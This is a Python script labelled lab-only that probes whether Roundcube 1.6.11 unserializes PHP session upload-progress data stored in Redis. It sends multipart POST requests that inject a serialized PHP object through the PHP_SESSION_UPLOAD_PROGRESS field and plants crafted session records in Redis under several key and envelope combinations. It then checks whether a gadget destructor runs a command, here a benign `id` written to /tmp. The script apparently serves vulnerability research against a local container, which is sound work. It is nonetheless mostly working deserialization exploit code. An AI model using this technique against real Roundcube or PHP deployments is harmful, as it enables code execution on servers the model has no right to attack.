#!/usr/bin/env python3
"""LAB-ONLY: does Roundcube 1.6.11's stock Redis session driver read the
upload-progress record written by PHP's phpredis session handler?

Separates the two preconditions instead of assuming them:
  key namespace : phpredis writes `PHPREDIS_SESSION:<sid>`; rcube reads `<sid>`
  value envelope: phpredis writes the raw `php_serialize` blob; rcube read()
                  does unserialize($value) and expects its own
                  a:3:{changed,ip,vars} wrapper

Modes: probe | flow | matrix | switch. Targets 127.0.0.1 only. The gadget is
the existing lab plugin VdSimple (fixed benign `id>/tmp/vd 2>&1`).
"""
import argparse
import json
import socket
import subprocess

OBJ = b'O:8:"VdSimple":0:{}'
NAME = b"upload_progress_"


def sh(container, cmd, timeout=90):
    return subprocess.run(["docker", "exec", container, "sh", "-c", cmd],
                          capture_output=True, text=True, timeout=timeout)


def rcli(redis, *args, stdin=None):
    return subprocess.run(["docker", "exec", "-i", redis, "redis-cli", "--raw", *args],
                          input=stdin, capture_output=True, text=True, timeout=60)


def body(value):
    bnd = b"----rcredis"
    return (b"--" + bnd + b"\r\n"
            b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
            b"|" + value + b"\r\n"
            b"--" + bnd + b"\r\n"
            b'Content-Disposition: form-data; name="f"; filename="x.txt"\r\n'
            b"Content-Type: text/plain\r\n\r\nZ\r\n--" + bnd + b"--\r\n")


def post(host, port, path, sid):
    data = body(OBJ)
    req = (f"POST {path} HTTP/1.1\r\nHost: x\r\n"
           f"Cookie: PHPSESSID={sid}; roundcube_sessid={sid}\r\n"
           f"Content-Type: multipart/form-data; boundary=----rcredis\r\n"
           f"Content-Length: {len(data)}\r\nConnection: close\r\n\r\n").encode() + data
    s = socket.create_connection((host, port), timeout=30)
    s.sendall(req)
    s.settimeout(30)
    try:
        while s.recv(65536):
            pass
    except socket.timeout:
        pass
    s.close()


def wrapper(vars_):
    return (b'a:3:{s:7:"changed";i:0;s:2:"ip";s:9:"127.0.0.1";'
            b's:4:"vars";s:%d:"' % len(vars_) + vars_ + b'";}')


def reset(web, redis, no_switch=True):
    rcli(redis, "FLUSHALL")
    flag = "touch /tmp/rc-vd-noswitch" if no_switch else "rm -f /tmp/rc-vd-noswitch"
    sh(web, f"{flag}; rm -f /tmp/rc-vd.log /tmp/vd")


def fires(web):
    log = sh(web, "cat /tmp/rc-vd.log 2>/dev/null").stdout
    proof = sh(web, "cat /tmp/vd 2>/dev/null").stdout.strip()
    return ("simple-dtor" in log), proof, log


def row(label, web, redis, host, port, sid, no_switch, put_key, put_val):
    reset(web, redis, no_switch)
    if put_val is not None:
        rcli(redis, "SET", put_key, put_val.decode())
    post(host, port, "/index.php", sid)
    hit, proof, log = fires(web)
    switched = "handler-switch-DISABLED" in log
    print(f"{label:<34} dtor={'YES' if hit else 'no ':<3} "
          f"plugin_switch_off={switched} proof={proof or 'none'}")
    return hit, proof, log


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("mode", choices=["probe", "flow", "matrix", "switch"])
    ap.add_argument("--target", default="127.0.0.1:18320")
    ap.add_argument("--container", default="php2shell-rc-redis-8427")
    ap.add_argument("--redis-container", default="php2shell-rc-redis-store")
    a = ap.parse_args()
    host, port = a.target.rsplit(":", 1)
    port = int(port)
    w, r = a.container, a.redis_container

    if a.mode == "probe":
        reset(w, r)
        post(host, port, "/prime_redis.php", "rcprobe8427abc")
        keys = rcli(r, "KEYS", "*").stdout.split()
        print("keys:", keys)
        print("writer_key_is_raw_sid:", "rcprobe8427abc" in keys)
        print("value_head:", rcli(r, "GET", "rcprobe8427abc").stdout[:70])
        print("probe_json:", sh(w, "curl -s http://127.0.0.1/probe.php").stdout.strip())
        print("save_path:", sh(w, "php -r 'echo ini_get(\"session.save_path\");'").stdout)
        print("ini upload_progress.cleanup (empty string == Off):",
              repr(sh(w, "php -r 'echo ini_get(\"session.upload_progress.cleanup\");'").stdout))
        return

    if a.mode == "flow":
        row("real flow (keys aligned)", w, r, host, port, "rcflow8427abc", True, "", None)
        print("keys:", rcli(r, "KEYS", "*").stdout.split())
        print("stored_head:", rcli(r, "GET", "rcflow8427abc").stdout[:90])
        print("ttl:", rcli(r, "TTL", "rcflow8427abc").stdout.strip())
        return

    if a.mode == "switch":
        row("raw key + wrapper, switch ON", w, r, host, port, "rcswitch8427abc",
            False, "rcswitch8427abc", wrapper(NAME + b"|" + OBJ))
        return

    print("key \\ envelope                     raw blob (phpredis)            rcube wrapper")
    blob = b'a:1:{s:36:"upload_progress_|O:8:"VdSimple":0:{}";a:0:{}}'
    row("raw sid + phpredis blob", w, r, host, port, "rcb1attr8427abc", True,
        "rcb1attr8427abc", blob)
    row("raw sid + rcube wrapper", w, r, host, port, "rcb2attr8427abc",
        True, "rcb2attr8427abc", wrapper(NAME + b"|" + OBJ))
    row("prefixed + phpredis blob", w, r, host, port, "rcb3attr8427abc",
        True, "PHPREDIS_SESSION:rcb3attr8427abc", blob)
    row("prefixed + rcube wrapper", w, r, host, port, "rcb4attr8427abc",
        True, "PHPREDIS_SESSION:rcb4attr8427abc", wrapper(NAME + b"|" + OBJ))


if __name__ == "__main__":
    main()
